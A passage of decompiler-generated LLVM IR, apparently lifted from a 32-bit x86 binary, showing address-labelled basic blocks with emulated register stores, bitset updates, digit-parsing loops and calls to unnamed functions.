  %v9_8049768 = icmp eq i32 %v1_8049768, 0
  store i1 %v9_8049768, i1* %zf.global-to-local, align 1
  store i32 %v1_8049768, i32* %eax.global-to-local, align 4
  %v2_804976b = add i32 %v3_8049e5a, 12
  %v3_804976b = inttoptr i32 %v2_804976b to i32*
  store i32 %v1_8049768, i32* %v3_804976b, align 4
  br label %dec_label_pc_804958e

dec_label_pc_8049773:                             ; preds = %dec_label_pc_804854f
  %v1_8049773 = add i32 %v0_80485a5, -1440
  %v2_8049773 = inttoptr i32 %v1_8049773 to i32*
  %v3_8049773 = load i32, i32* %v2_8049773, align 4
  %v1_804977b = urem i32 %v3_8049773, 32
  store i32 %v1_804977b, i32* %eax.global-to-local, align 4
  %v2_804977e = udiv i32 %v3_8049773, 32
  store i32 %v2_804977e, i32* %edx.global-to-local, align 4
  %v0_8049781 = load i32, i32* @esp, align 4
  %v2_8049781 = mul nuw nsw i32 %v2_804977e, 4
  %v3_8049781 = add nuw nsw i32 %v2_8049781, 20740
  %v4_8049781 = add i32 %v3_8049781, %v0_8049781
  %v5_8049781 = inttoptr i32 %v4_8049781 to i32*
  %v6_8049781 = load i32, i32* %v5_8049781, align 4
  %v9_8049781 = shl i32 1, %v1_804977b
  %v12_8049781 = or i32 %v6_8049781, %v9_8049781
  store i32 %v12_8049781, i32* %v5_8049781, align 4
  %v0_8049789 = load i32, i32* @esi, align 4
  %v1_8049789 = add i32 %v0_8049789, -1440
  %v2_8049789 = inttoptr i32 %v1_8049789 to i32*
  %v3_8049789 = load i32, i32* %v2_8049789, align 4
  store i32 %v3_8049789, i32* %eax.global-to-local, align 4
  %v1_804978f = load i32, i32* @esp, align 4
  %v2_804978f = add i32 %v1_804978f, 72
  %v3_804978f = inttoptr i32 %v2_804978f to i32*
  %v4_804978f = load i32, i32* %v3_804978f, align 4
  %v5_804978f = sub i32 %v3_8049789, %v4_804978f
  %v11_804978f = xor i32 %v4_804978f, %v3_8049789
  %v12_804978f = xor i32 %v5_804978f, %v3_8049789
  %v13_804978f = and i32 %v12_804978f, %v11_804978f
  %v14_804978f = icmp slt i32 %v13_804978f, 0
  %v15_804978f = icmp eq i32 %v5_804978f, 0
  store i1 %v15_804978f, i1* %zf.global-to-local, align 1
  %v16_804978f = icmp slt i32 %v5_804978f, 0
  %v3_8049793 = icmp ne i1 %v16_804978f, %v14_804978f
  %v4_8049793 = or i1 %v15_804978f, %v3_8049793
  br i1 %v4_8049793, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_804979e:                             ; preds = %dec_label_pc_8048c10
  %v2_804979e = add i32 %v0_8048c1d, 12
  %v3_804979e = inttoptr i32 %v2_804979e to i32*
  store i32 %v3_8048bde, i32* %v3_804979e, align 4
  %v2_804979f = add i32 %v0_8048c1d, 8
  %v3_804979f = inttoptr i32 %v2_804979f to i32*
  store i32 %v3_8048bde, i32* %v3_804979f, align 4
  %v0_80497a0 = load i32, i32* @esi, align 4
  %v2_80497a0 = add i32 %v0_8048c1d, 4
  %v3_80497a0 = inttoptr i32 %v2_80497a0 to i32*
  store i32 %v0_80497a0, i32* %v3_80497a0, align 4
  %v1_80497a1 = add i32 %v0_8048c1d, 112
  %v2_80497a1 = inttoptr i32 %v1_80497a1 to i32*
  %v3_80497a1 = load i32, i32* %v2_80497a1, align 4
  store i32 %v3_80497a1, i32* @ebx, align 4
  %v3_80497a5 = inttoptr i32 %v0_8048c1d to i32*
  store i32 %v3_80497a1, i32* %v3_80497a5, align 4
  %v3_80497a6 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80497a6, i32* %eax.global-to-local, align 4
  %v0_80497ab = load i32, i32* @esp, align 4
  %v1_80497ab = add i32 %v0_80497ab, 16
  %v6_80497ab = icmp eq i32 %v1_80497ab, 0
  store i1 %v6_80497ab, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c28

dec_label_pc_80497b3:                             ; preds = %dec_label_pc_8048d89
  %v1_80497b3 = call i32 @function_8052719(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80497b3, i32* %eax.global-to-local, align 4
  store i32 %v1_80497b3, i32* @ebx, align 4
  br label %dec_label_pc_80497ba

dec_label_pc_80497ba:                             ; preds = %dec_label_pc_80497ed, %dec_label_pc_80497b3
  %v0_80497ba = phi i32 [ %v1_80497b3, %dec_label_pc_80497b3 ], [ %v0_80497ba.pre, %dec_label_pc_80497ed ]
  %v1_80497ba = inttoptr i32 %v0_80497ba to i32*
  store i32 0, i32* %v1_80497ba, align 4
  %v0_80497c0 = load i32, i32* @esp, align 4
  %v1_80497c0 = add i32 %v0_80497c0, -4
  %v2_80497c0 = inttoptr i32 %v1_80497c0 to i32*
  store i32 16384, i32* %v2_80497c0, align 4
  %v1_80497c5 = add i32 %v0_80497c0, -8
  %v2_80497c5 = inttoptr i32 %v1_80497c5 to i32*
  store i32 10240, i32* %v2_80497c5, align 4
  %v1_80497ca = add i32 %v0_80497c0, 131
  store i32 %v1_80497ca, i32* %ecx.global-to-local, align 4
  %v2_80497d1 = add i32 %v0_80497c0, -12
  %v3_80497d1 = inttoptr i32 %v2_80497d1 to i32*
  store i32 %v1_80497ca, i32* %v3_80497d1, align 4
  %v1_80497d2 = add i32 %v0_80497c0, 92
  %v2_80497d2 = inttoptr i32 %v1_80497d2 to i32*
  %v3_80497d2 = load i32, i32* %v2_80497d2, align 4
  store i32 %v3_80497d2, i32* %eax.global-to-local, align 4
  %v1_80497d6 = add i32 %v3_80497d2, -1452
  %v2_80497d6 = inttoptr i32 %v1_80497d6 to i32*
  %v3_80497d6 = load i32, i32* %v2_80497d6, align 4
  %v2_80497dc = add i32 %v0_80497c0, -16
  %v3_80497dc = inttoptr i32 %v2_80497dc to i32*
  store i32 %v3_80497d6, i32* %v3_80497dc, align 4
  %v0_80497dd = call i32 @function_80528ae()
  store i32 %v0_80497dd, i32* %eax.global-to-local, align 4
  %v0_80497e2 = load i32, i32* @esp, align 4
  %v1_80497e2 = add i32 %v0_80497e2, 16
  %v1_80497e5 = icmp eq i32 %v0_80497dd, 0
  store i1 %v1_80497e5, i1* %zf.global-to-local, align 1
  br i1 %v1_80497e5, label %dec_label_pc_8049b04, label %dec_label_pc_80497ed

dec_label_pc_80497ed:                             ; preds = %dec_label_pc_80497ba
  %v1_80497ed = add i32 %v0_80497dd, 1
  %v8_80497ed = icmp eq i32 %v1_80497ed, 0
  store i1 %v8_80497ed, i1* %zf.global-to-local, align 1
  store i32 %v1_80497ed, i32* %eax.global-to-local, align 4
  %v1_80497ee = icmp eq i1 %v8_80497ed, false
  %v0_80497ba.pre = load i32, i32* @ebx, align 4
  br i1 %v1_80497ee, label %dec_label_pc_80497ba, label %dec_label_pc_80497f0

dec_label_pc_80497f0:                             ; preds = %dec_label_pc_80497ed
  %v1_80497f0 = inttoptr i32 %v0_80497ba.pre to i32*
  %v2_80497f0 = load i32, i32* %v1_80497f0, align 4
  %v11_80497f0 = icmp eq i32 %v2_80497f0, 11
  store i1 %v11_80497f0, i1* %zf.global-to-local, align 1
  br i1 %v11_80497f0, label %dec_label_pc_8049c31, label %dec_label_pc_80497f9

dec_label_pc_80497f9:                             ; preds = %dec_label_pc_80497f0, %dec_label_pc_8049b04
  %v0_80497f9 = phi i32 [ %v1_80497e2, %dec_label_pc_80497f0 ], [ %v0_80497f9.pre, %dec_label_pc_8049b04 ]
  %v9_80497f9 = icmp eq i32 %v0_80497f9, 12
  store i1 %v9_80497f9, i1* %zf.global-to-local, align 1
  %v1_80497fc = add i32 %v0_80497f9, 92
  %v2_80497fc = inttoptr i32 %v1_80497fc to i32*
  %v3_80497fc = load i32, i32* %v2_80497fc, align 4
  store i32 %v3_80497fc, i32* %edx.global-to-local, align 4
  %v1_8049800 = add i32 %v3_80497fc, -1452
  %v2_8049800 = inttoptr i32 %v1_8049800 to i32*
  %v3_8049800 = load i32, i32* %v2_8049800, align 4
  store i32 %v3_8049800, i32* %ecx.global-to-local, align 4
  %v2_8049806 = add i32 %v0_80497f9, -16
  %v3_8049806 = inttoptr i32 %v2_8049806 to i32*
  store i32 %v3_8049800, i32* %v3_8049806, align 4
  %v1_8049807 = call i32 @function_80521e1(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8049807, i32* %eax.global-to-local, align 4
  %v0_804980c = load i32, i32* @esp, align 4
  %v1_804980c = add i32 %v0_804980c, 108
  %v2_804980c = inttoptr i32 %v1_804980c to i32*
  %v3_804980c = load i32, i32* %v2_804980c, align 4
  store i32 %v3_804980c, i32* %ecx.global-to-local, align 4
  %v6_8049810 = icmp eq i32 %v0_804980c, -16
  store i1 %v6_8049810, i1* %zf.global-to-local, align 1
  %v1_8049813 = add i32 %v3_804980c, -1452
  %v2_8049813 = inttoptr i32 %v1_8049813 to i32*
  store i32 -1, i32* %v2_8049813, align 4
  %v0_804981d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804981d = add i32 %v0_804981d, -1448
  %v2_804981d = inttoptr i32 %v1_804981d to i8*
  store i8 0, i8* %v2_804981d, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049829:                             ; preds = %dec_label_pc_8048557
  %v1_8049829 = add i32 %v0_80485a5, -1440
  %v2_8049829 = inttoptr i32 %v1_8049829 to i32*
  %v3_8049829 = load i32, i32* %v2_8049829, align 4
  %v1_8049831 = urem i32 %v3_8049829, 32
  store i32 %v1_8049831, i32* %eax.global-to-local, align 4
  %v2_8049834 = udiv i32 %v3_8049829, 32
  store i32 %v2_8049834, i32* %edx.global-to-local, align 4
  %v0_8049837 = load i32, i32* @esp, align 4
  %v2_8049837 = mul nuw nsw i32 %v2_8049834, 4
  %v3_8049837 = add nuw nsw i32 %v2_8049837, 20740
  %v4_8049837 = add i32 %v3_8049837, %v0_8049837
  %v5_8049837 = inttoptr i32 %v4_8049837 to i32*
  %v6_8049837 = load i32, i32* %v5_8049837, align 4
  %v9_8049837 = shl i32 1, %v1_8049831
  %v12_8049837 = or i32 %v6_8049837, %v9_8049837
  store i32 %v12_8049837, i32* %v5_8049837, align 4
  %v0_804983f = load i32, i32* @esi, align 4
  %v1_804983f = add i32 %v0_804983f, -1440
  %v2_804983f = inttoptr i32 %v1_804983f to i32*
  %v3_804983f = load i32, i32* %v2_804983f, align 4
  store i32 %v3_804983f, i32* %eax.global-to-local, align 4
  %v1_8049845 = load i32, i32* @esp, align 4
  %v2_8049845 = add i32 %v1_8049845, 72
  %v3_8049845 = inttoptr i32 %v2_8049845 to i32*
  %v4_8049845 = load i32, i32* %v3_8049845, align 4
  %v5_8049845 = sub i32 %v3_804983f, %v4_8049845
  %v11_8049845 = xor i32 %v4_8049845, %v3_804983f
  %v12_8049845 = xor i32 %v5_8049845, %v3_804983f
  %v13_8049845 = and i32 %v12_8049845, %v11_8049845
  %v14_8049845 = icmp slt i32 %v13_8049845, 0
  %v15_8049845 = icmp eq i32 %v5_8049845, 0
  store i1 %v15_8049845, i1* %zf.global-to-local, align 1
  %v16_8049845 = icmp slt i32 %v5_8049845, 0
  %v3_8049849 = icmp ne i1 %v16_8049845, %v14_8049845
  %v4_8049849 = or i1 %v15_8049845, %v3_8049849
  br i1 %v4_8049849, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8049854:                             ; preds = %dec_label_pc_80493fd, %dec_label_pc_80493d2
  %v1_8049854.in = phi i32 [ %v0_8049452, %dec_label_pc_80493fd ], [ %v0_80493f3, %dec_label_pc_80493d2 ]
  %v0_8049854 = load i32, i32* @edi, align 4
  %v2_8049854 = add i32 %v1_8049854.in, 12
  %v3_8049854 = inttoptr i32 %v2_8049854 to i32*
  store i32 %v0_8049854, i32* %v3_8049854, align 4
  %v0_8049855 = load i32, i32* @edi, align 4
  %v2_8049855 = add i32 %v1_8049854.in, 8
  %v3_8049855 = inttoptr i32 %v2_8049855 to i32*
  store i32 %v0_8049855, i32* %v3_8049855, align 4
  %v1_8049856 = add i32 %v1_8049854.in, 4
  %v2_8049856 = inttoptr i32 %v1_8049856 to i32*
  store i32 0, i32* %v2_8049856, align 4
  %v2_8049858 = inttoptr i32 %v1_8049854.in to i32*
  store i32 37, i32* %v2_8049858, align 4
  %v3_804985a = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804985a, i32* %eax.global-to-local, align 4
  %v0_804985f = load i32, i32* @esp, align 4
  %v9_804985f = icmp eq i32 %v0_804985f, -12
  store i1 %v9_804985f, i1* %zf.global-to-local, align 1
  %v2_8049862 = add i32 %v0_804985f, 8
  %v3_8049862 = inttoptr i32 %v2_8049862 to i32*
  store i32 %v3_804985a, i32* %v3_8049862, align 4
  %v1_8049863 = add i32 %v0_804985f, 120
  %v2_8049863 = inttoptr i32 %v1_8049863 to i32*
  %v3_8049863 = load i32, i32* %v2_8049863, align 4
  %v2_8049867 = add i32 %v0_804985f, 4
  %v3_8049867 = inttoptr i32 %v2_8049867 to i32*
  store i32 %v3_8049863, i32* %v3_8049867, align 4
  %v1_8049868 = add i32 %v0_804985f, 147
  store i32 %v1_8049868, i32* @ecx, align 4
  %v3_804986f = inttoptr i32 %v0_804985f to i32*
  store i32 %v1_8049868, i32* %v3_804986f, align 4
  %v4_8049870 = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049875 = load i32, i32* @esp, align 4
  %v1_8049875 = add i32 %v0_8049875, 16
  %v1_8049878 = add i32 %v4_8049870, 1
  %v8_8049878 = icmp eq i32 %v1_8049878, 0
  store i1 %v8_8049878, i1* %zf.global-to-local, align 1
  store i32 %v1_8049878, i32* %eax.global-to-local, align 4
  br i1 %v8_8049878, label %dec_label_pc_8049a77, label %dec_label_pc_804987f

dec_label_pc_804987f:                             ; preds = %dec_label_pc_8049854
  %v0_804987f = load i32, i32* @ebx, align 4
  %v2_804987f = add i32 %v0_8049875, 12
  %v3_804987f = inttoptr i32 %v2_804987f to i32*
  store i32 %v0_804987f, i32* %v3_804987f, align 4
  %v0_8049880 = load i32, i32* @ebx, align 4
  %v2_8049880 = add i32 %v0_8049875, 8
  %v3_8049880 = inttoptr i32 %v2_8049880 to i32*
  store i32 %v0_8049880, i32* %v3_8049880, align 4
  %v1_8049881 = add i32 %v0_8049875, 4
  %v2_8049881 = inttoptr i32 %v1_8049881 to i32*
  store i32 0, i32* %v2_8049881, align 4
  %v2_8049883 = inttoptr i32 %v0_8049875 to i32*
  store i32 37, i32* %v2_8049883, align 4
  %v3_8049885 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049885, i32* %eax.global-to-local, align 4
  %v0_804988a = load i32, i32* @esp, align 4
  %v9_804988a = icmp eq i32 %v0_804988a, -12
  store i1 %v9_804988a, i1* %zf.global-to-local, align 1
  %v2_804988d = add i32 %v0_804988a, 8
  %v3_804988d = inttoptr i32 %v2_804988d to i32*
  store i32 %v3_8049885, i32* %v3_804988d, align 4
  %v1_804988e = add i32 %v0_804988a, 120
  %v2_804988e = inttoptr i32 %v1_804988e to i32*
  %v3_804988e = load i32, i32* %v2_804988e, align 4
  store i32 %v3_804988e, i32* @ecx, align 4
  %v2_8049892 = add i32 %v0_804988a, 4
  %v3_8049892 = inttoptr i32 %v2_8049892 to i32*
  store i32 %v3_804988e, i32* %v3_8049892, align 4
  %v1_8049893 = add i32 %v0_804988a, 147
  store i32 %v1_8049893, i32* %eax.global-to-local, align 4
  %v3_804989a = inttoptr i32 %v0_804988a to i32*
  store i32 %v1_8049893, i32* %v3_804989a, align 4
  %v4_804989b = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804989b, i32* %eax.global-to-local, align 4
  %v0_80498a0 = load i32, i32* @esp, align 4
  %v6_80498a0 = icmp eq i32 %v0_80498a0, -16
  store i1 %v6_80498a0, i1* %zf.global-to-local, align 1
  store i32 %v4_804989b, i32* %ebx.global-to-local, align 4
  %v3_80498a5 = add i32 %v4_804989b, 147
  %v4_80498a5 = add i32 %v3_80498a5, %v0_80498a0
  %v5_80498a5 = inttoptr i32 %v4_80498a5 to i8*
  %v6_80498a5 = load i8, i8* %v5_80498a5, align 1
  %v12_80498a5 = icmp eq i8 %v6_80498a5, 32
  %v1_80498ad = zext i1 %v12_80498a5 to i32
  %v1_80498b0 = add i32 %v0_80498a0, 147
  store i32 %v1_80498b0, i32* %esi.global-to-local, align 4
  store i32 %v1_80498ad, i32* %eax.global-to-local, align 4
  %v1_80498bc = add i32 %v0_80498a0, 12
  %v2_80498bc = inttoptr i32 %v1_80498bc to i32*
  store i32 2, i32* %v2_80498bc, align 4
  %v1_80498be = add i32 %v0_80498a0, 8
  %v2_80498be = inttoptr i32 %v1_80498be to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_80498be, align 4
  %v0_80498c3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80498c3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80498c3 = add i32 %v1_80498c3, %v0_80498c3
  store i32 %v2_80498c3, i32* @ebx, align 4
  %v1_80498c5 = add i32 %v0_80498a0, 120
  %v2_80498c5 = inttoptr i32 %v1_80498c5 to i32*
  %v3_80498c5 = load i32, i32* %v2_80498c5, align 4
  %v2_80498c9 = sub i32 %v3_80498c5, %v2_80498c3
  store i32 %v2_80498c9, i32* %eax.global-to-local, align 4
  %v0_80498cb = load i32, i32* %esi.global-to-local, align 4
  %v2_80498cb = add i32 %v0_80498cb, %v2_80498c3
  %v12_80498cb = icmp eq i32 %v2_80498cb, 0
  store i1 %v12_80498cb, i1* %zf.global-to-local, align 1
  store i32 %v2_80498cb, i32* @esi, align 4
  %v2_80498cd = add i32 %v0_80498a0, 4
  %v3_80498cd = inttoptr i32 %v2_80498cd to i32*
  store i32 %v2_80498c9, i32* %v3_80498cd, align 4
  %v0_80498ce = load i32, i32* @esi, align 4
  %v3_80498ce = inttoptr i32 %v0_80498a0 to i32*
  store i32 %v0_80498ce, i32* %v3_80498ce, align 4
  %v0_80498cf = call i32 @function_8051cf0()
  store i32 %v0_80498cf, i32* %eax.global-to-local, align 4
  %v0_80498d4 = load i32, i32* @esp, align 4
  %v1_80498d4 = add i32 %v0_80498d4, 16
  store i32 %v0_80498cf, i32* @edi, align 4
  %v10_80498d9 = icmp eq i32 %v0_80498cf, -1
  store i1 %v10_80498d9, i1* %zf.global-to-local, align 1
  br i1 %v10_80498d9, label %dec_label_pc_8049a77, label %dec_label_pc_80498e2

dec_label_pc_80498e2:                             ; preds = %dec_label_pc_804987f
  %v10_80498e2 = icmp eq i32 %v0_80498cf, 1
  store i1 %v10_80498e2, i1* %zf.global-to-local, align 1
  %v7_80498e5 = icmp sgt i32 %v0_80498cf, 1
  br i1 %v7_80498e5, label %dec_label_pc_80498e7, label %dec_label_pc_80498ea

dec_label_pc_80498e7:                             ; preds = %dec_label_pc_80498e2
  %v1_80498e7 = add i32 %v0_80498cf, -2
  %v9_80498e7 = icmp eq i32 %v1_80498e7, 0
  store i1 %v9_80498e7, i1* %zf.global-to-local, align 1
  store i32 %v1_80498e7, i32* @edi, align 4
  br label %dec_label_pc_80498ea

dec_label_pc_80498ea:                             ; preds = %dec_label_pc_80498e2, %dec_label_pc_80498e7
  %v1_80498ea = add i32 %v0_80498d4, 20920
  store i32 %v1_80498ea, i32* %eax.global-to-local, align 4
  %v1_80498f1 = add i32 %v0_80498d4, 20916
  %v2_80498f1 = inttoptr i32 %v1_80498f1 to i32*
  store i32 0, i32* %v2_80498f1, align 4
  %v0_80498fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80498fc = load i32, i32* @ebx, align 4
  %v2_80498fc = add i32 %v1_80498fc, %v0_80498fc
  %v12_80498fc = icmp eq i32 %v2_80498fc, 0
  store i1 %v12_80498fc, i1* %zf.global-to-local, align 1
  store i32 %v2_80498fc, i32* %eax.global-to-local, align 4
  %v0_80498fe = load i32, i32* @esi, align 4
  store i32 %v0_80498fe, i32* %edx.global-to-local, align 4
  %v1_8049900 = load i32, i32* @edi, align 4
  %v2_8049900 = add i32 %v2_80498fc, -20773
  %v3_8049900 = add i32 %v2_8049900, %v1_8049900
  %v4_8049900 = inttoptr i32 %v3_8049900 to i8*
  store i8 0, i8* %v4_8049900, align 1
  %v0_8049908 = load i32, i32* @esi, align 4
  %v1_8049908 = inttoptr i32 %v0_8049908 to i8*
  %v2_8049908 = load i8, i8* %v1_8049908, align 1
  %v3_8049908 = zext i8 %v2_8049908 to i32
  %v4_8049908 = load i32, i32* @ecx, align 4
  %v5_8049908 = and i32 %v4_8049908, -256
  %v6_8049908 = or i32 %v5_8049908, %v3_8049908
  store i32 %v6_8049908, i32* @ecx, align 4
  %v1_804990a = add i32 %v6_8049908, -48
  store i32 %v1_804990a, i32* %eax.global-to-local, align 4
  %v1_804990d = trunc i32 %v1_804990a to i8
  %v10_804990d = icmp eq i8 %v1_804990d, 9
  store i1 %v10_804990d, i1* %zf.global-to-local, align 1
  %tmp240 = icmp ult i8 %v1_804990d, 10
  br i1 %tmp240, label %dec_label_pc_8049911, label %dec_label_pc_8049928

dec_label_pc_8049911:                             ; preds = %dec_label_pc_80498ea
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049913

dec_label_pc_8049913:                             ; preds = %dec_label_pc_8049913, %dec_label_pc_8049911
  %v0_8049913 = phi i32 [ %v0_804991b, %dec_label_pc_8049913 ], [ 0, %dec_label_pc_8049911 ]
  %v1_8049913 = add i32 %v0_8049913, 1
  %v8_8049913 = icmp eq i32 %v1_8049913, 0
  store i1 %v8_8049913, i1* %zf.global-to-local, align 1
  store i32 %v1_8049913, i32* %edx.global-to-local, align 4
  %v1_8049914 = load i32, i32* @esp, align 4
  %v2_8049914 = add i32 %v1_8049914, 20900
  %v3_8049914 = inttoptr i32 %v2_8049914 to i32*
  store i32 %v1_8049913, i32* %v3_8049914, align 4
  %v0_804991b = load i32, i32* %edx.global-to-local, align 4
  %v1_804991b = load i32, i32* @esi, align 4
  %v2_804991b = add i32 %v1_804991b, %v0_804991b
  %v3_804991b = inttoptr i32 %v2_804991b to i8*
  %v4_804991b = load i8, i8* %v3_804991b, align 1
  %v5_804991b = zext i8 %v4_804991b to i32
  %v6_804991b = load i32, i32* @ecx, align 4
  %v7_804991b = and i32 %v6_804991b, -256
  %v8_804991b = or i32 %v7_804991b, %v5_804991b
  store i32 %v8_804991b, i32* @ecx, align 4
  %v1_804991e = add i32 %v8_804991b, -48
  store i32 %v1_804991e, i32* %eax.global-to-local, align 4
  %v1_8049921 = trunc i32 %v1_804991e to i8
  %v10_8049921 = icmp eq i8 %v1_8049921, 9
  store i1 %v10_8049921, i1* %zf.global-to-local, align 1
  %tmp241 = icmp ult i8 %v1_8049921, 10
  br i1 %tmp241, label %dec_label_pc_8049913, label %dec_label_pc_8049925

dec_label_pc_8049925:                             ; preds = %dec_label_pc_8049913
  store i32 %v2_804991b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049928

dec_label_pc_8049928:                             ; preds = %dec_label_pc_80498ea, %dec_label_pc_8049925
  %v0_8049928 = phi i32 [ %v6_8049908, %dec_label_pc_80498ea ], [ %v8_804991b, %dec_label_pc_8049925 ]
  %v3_8049928 = trunc i32 %v0_8049928 to i8
  %v4_8049928 = icmp eq i8 %v3_8049928, 0
  store i1 %v4_8049928, i1* %zf.global-to-local, align 1
  br i1 %v4_8049928, label %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, label %dec_label_pc_8049930

dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge: ; preds = %dec_label_pc_8049928
  %v0_8049a77.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049a77

dec_label_pc_8049930:                             ; preds = %dec_label_pc_8049928
  %v0_8049930 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049930 = inttoptr i32 %v0_8049930 to i8*
  store i8 0, i8* %v1_8049930, align 1
  %v0_8049933 = load i32, i32* @esp, align 4
  %v1_8049933 = add i32 %v0_8049933, 20900
  %v2_8049933 = inttoptr i32 %v1_8049933 to i32*
  %v3_8049933 = load i32, i32* %v2_8049933, align 4
  store i32 %v3_8049933, i32* %edx.global-to-local, align 4
  %v1_804993a = add i32 %v3_8049933, 1
  store i32 %v1_804993a, i32* %eax.global-to-local, align 4
  store i32 %v1_804993a, i32* %v2_8049933, align 4
  %v0_8049944 = load i32, i32* @esi, align 4
  %v1_8049944 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049944 = add i32 %v1_8049944, %v0_8049944
  %v3_8049944 = inttoptr i32 %v2_8049944 to i8*
  %v4_8049944 = load i8, i8* %v3_8049944, align 1
  %v10_8049944 = icmp eq i8 %v4_8049944, 32
  store i1 %v10_8049944, i1* %zf.global-to-local, align 1
  br i1 %v10_8049944, label %dec_label_pc_8049ee6, label %dec_label_pc_804994e

dec_label_pc_804994e:                             ; preds = %dec_label_pc_8049930, %dec_label_pc_8049ee6
  %v0_8049951 = phi i32 [ %v0_8049944, %dec_label_pc_8049930 ], [ %v0_8049951.pre, %dec_label_pc_8049ee6 ]
  %v0_804994e = load i32, i32* @esp, align 4
  store i32 %v0_8049951, i32* %eax.global-to-local, align 4
  %v1_8049953 = add i32 %v0_804994e, 20900
  %v2_8049953 = inttoptr i32 %v1_8049953 to i32*
  %v3_8049953 = load i32, i32* %v2_8049953, align 4
  store i32 %v3_8049953, i32* %edx.global-to-local, align 4
  %v2_804995a = add i32 %v3_8049953, %v0_8049951
  %v12_804995a = icmp eq i32 %v2_804995a, 0
  store i1 %v12_804995a, i1* %zf.global-to-local, align 1
  store i32 %v2_804995a, i32* %eax.global-to-local, align 4
  %v2_804995c = add i32 %v0_804994e, -16
  %v3_804995c = inttoptr i32 %v2_804995c to i32*
  store i32 %v2_804995a, i32* %v3_804995c, align 4
  %v2_804995d = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_804995d, i32* %eax.global-to-local, align 4
  %v0_8049962 = load i32, i32* @esp, align 4
  %v1_8049965 = add i32 %v0_8049962, 8
  %v2_8049965 = inttoptr i32 %v1_8049965 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b10.17 to i32), i32* %v2_8049965, align 4
  %v2_804996a = add i32 %v0_8049962, 4
  %v3_804996a = inttoptr i32 %v2_804996a to i32*
  store i32 %v2_804995d, i32* %v3_804996a, align 4
  %v1_804996b = add i32 %v0_8049962, 20916
  %v2_804996b = inttoptr i32 %v1_804996b to i32*
  %v3_804996b = load i32, i32* %v2_804996b, align 4
  store i32 %v3_804996b, i32* @ebp, align 4
  %v0_8049972 = load i32, i32* @esi, align 4
  %v2_8049974 = add i32 %v0_8049972, %v3_804996b
  %v12_8049974 = icmp eq i32 %v2_8049974, 0
  store i1 %v12_8049974, i1* %zf.global-to-local, align 1
  store i32 %v2_8049974, i32* %eax.global-to-local, align 4
  %v3_8049976 = inttoptr i32 %v0_8049962 to i32*
  store i32 %v2_8049974, i32* %v3_8049976, align 4
  %v4_8049977 = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804997c = load i32, i32* @esp, align 4
  %v1_804997c = add i32 %v0_804997c, 16
  %v1_804997f = add i32 %v4_8049977, 1
  %v8_804997f = icmp eq i32 %v1_804997f, 0
  store i1 %v8_804997f, i1* %zf.global-to-local, align 1
  store i32 %v1_804997f, i32* %eax.global-to-local, align 4
  br i1 %v8_804997f, label %dec_label_pc_80499c3, label %dec_label_pc_8049982

dec_label_pc_8049982:                             ; preds = %dec_label_pc_804994e
  %v0_8049985 = load i32, i32* @esi, align 4
  store i32 %v0_8049985, i32* %eax.global-to-local, align 4
  %v1_8049987 = add i32 %v0_804997c, 20916
  %v2_8049987 = inttoptr i32 %v1_8049987 to i32*
  %v3_8049987 = load i32, i32* %v2_8049987, align 4
  %v2_804998e = add i32 %v3_8049987, %v0_8049985
  %v12_804998e = icmp eq i32 %v2_804998e, 0
  store i1 %v12_804998e, i1* %zf.global-to-local, align 1
  store i32 %v2_804998e, i32* %eax.global-to-local, align 4
  %v3_8049990 = inttoptr i32 %v0_804997c to i32*
  store i32 %v2_804998e, i32* %v3_8049990, align 4
  %v2_8049991 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049991, i32* %eax.global-to-local, align 4
  %v0_8049996 = load i32, i32* @esp, align 4
  %v1_8049999 = add i32 %v0_8049996, 8
  %v2_8049999 = inttoptr i32 %v1_8049999 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b10.17 to i32), i32* %v2_8049999, align 4
  %v2_804999e = add i32 %v0_8049996, 4
  %v3_804999e = inttoptr i32 %v2_804999e to i32*
  store i32 %v2_8049991, i32* %v3_804999e, align 4
  %v1_804999f = add i32 %v0_8049996, 20916
  %v2_804999f = inttoptr i32 %v1_804999f to i32*
  %v3_804999f = load i32, i32* %v2_804999f, align 4
  store i32 %v3_804999f, i32* @ecx, align 4
  %v0_80499a6 = load i32, i32* @esi, align 4
  %v2_80499a8 = add i32 %v0_80499a6, %v3_804999f
  %v12_80499a8 = icmp eq i32 %v2_80499a8, 0
  store i1 %v12_80499a8, i1* %zf.global-to-local, align 1
  store i32 %v2_80499a8, i32* %eax.global-to-local, align 4
  %v3_80499aa = inttoptr i32 %v0_8049996 to i32*
  store i32 %v2_80499a8, i32* %v3_80499aa, align 4
